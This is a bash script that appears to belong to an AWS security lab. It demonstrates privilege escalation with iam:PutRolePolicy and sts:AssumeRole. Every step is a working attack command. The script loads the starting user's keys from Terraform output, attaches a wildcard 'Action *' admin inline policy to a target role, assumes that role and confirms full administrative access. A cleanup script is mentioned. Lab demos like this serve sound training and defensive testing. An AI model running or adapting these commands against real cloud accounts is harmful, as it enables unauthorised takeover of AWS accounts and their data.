#!/bin/bash

# Demo script for iam-putrolepolicy+sts-assumerole privilege escalation
# This scenario demonstrates how a user with iam:PutRolePolicy and sts:AssumeRole
# can add an inline admin policy to a role they can assume, then assume that role for admin access


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-017-to-admin-starting-user"
TARGET_ROLE="pl-prod-iam-017-to-admin-target-role"
INLINE_POLICY_NAME="admin-escalation"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}iam:PutRolePolicy + sts:AssumeRole Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_017_iam_putrolepolicy_sts_assumerole.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Check target role's current inline policies
echo -e "${YELLOW}Step 5: Checking target role's current inline policies${NC}"
TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"
echo "Target role: $TARGET_ROLE_ARN"
echo ""

echo "Current inline policies on target role:"
INLINE_POLICIES=$(aws iam list-role-policies \
    --role-name $TARGET_ROLE \
    --query 'PolicyNames' \
    --output text 2>/dev/null || echo "None")

if [ -z "$INLINE_POLICIES" ] || [ "$INLINE_POLICIES" == "None" ]; then
    echo "  (No inline policies)"
else
    echo "  $INLINE_POLICIES"
fi
echo -e "${GREEN}✓ Target role currently has no admin inline policies${NC}\n"

# Step 6: Add inline admin policy to target role using PutRolePolicy
echo -e "${YELLOW}Step 6: Adding inline admin policy to target role${NC}"
echo "This is the privilege escalation action!"
echo "Policy name: $INLINE_POLICY_NAME"
echo ""

# Create admin policy document
cat > /tmp/admin-escalation-policy.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF

show_attack_cmd "aws iam put-role-policy --role-name $TARGET_ROLE --policy-name $INLINE_POLICY_NAME --policy-document file:///tmp/admin-escalation-policy.json"
aws iam put-role-policy \
    --role-name $TARGET_ROLE \
    --policy-name $INLINE_POLICY_NAME \
    --policy-document file:///tmp/admin-escalation-policy.json

echo -e "${GREEN}✓ Successfully added inline admin policy to target role${NC}\n"

# Clean up temp file
rm -f /tmp/admin-escalation-policy.json

# Wait for policy to propagate (15 seconds required for IAM changes)
echo -e "${YELLOW}Waiting 15 seconds for policy to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# Step 7: Verify inline policy was added
echo -e "${YELLOW}Step 7: Verifying inline policy addition${NC}"
echo "Updated inline policies on target role:"
UPDATED_POLICIES=$(aws iam list-role-policies \
    --role-name $TARGET_ROLE \
    --query 'PolicyNames' \
    --output text)

if echo "$UPDATED_POLICIES" | grep -q "$INLINE_POLICY_NAME"; then
    echo "  $UPDATED_POLICIES"
    echo -e "${GREEN}✓ Inline policy '$INLINE_POLICY_NAME' is now attached${NC}\n"
else
    echo -e "${RED}✗ Failed to verify inline policy addition${NC}"
    exit 1
fi

# Step 8: Assume the target role
echo -e "${YELLOW}Step 8: Assuming the target role with admin permissions${NC}"
echo "Role ARN: $TARGET_ROLE_ARN"

show_attack_cmd "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn $TARGET_ROLE_ARN \
    --role-session-name demo-attack-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we assumed the role
show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed target role${NC}\n"

# Step 9: Verify administrator access
echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."
echo ""

show_cmd "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (no admin permissions)"
echo "2. Used iam:PutRolePolicy to add inline admin policy '$INLINE_POLICY_NAME' to: $TARGET_ROLE"
echo "3. Used sts:AssumeRole to assume the now-privileged role"
echo "4. Achieved: Full administrative access to the AWS account"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (PutRolePolicy) → $TARGET_ROLE → (AssumeRole) → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Inline policy '$INLINE_POLICY_NAME' added to: $TARGET_ROLE"

echo -e "\n${RED}⚠ Warning: The target role now has administrative permissions!${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
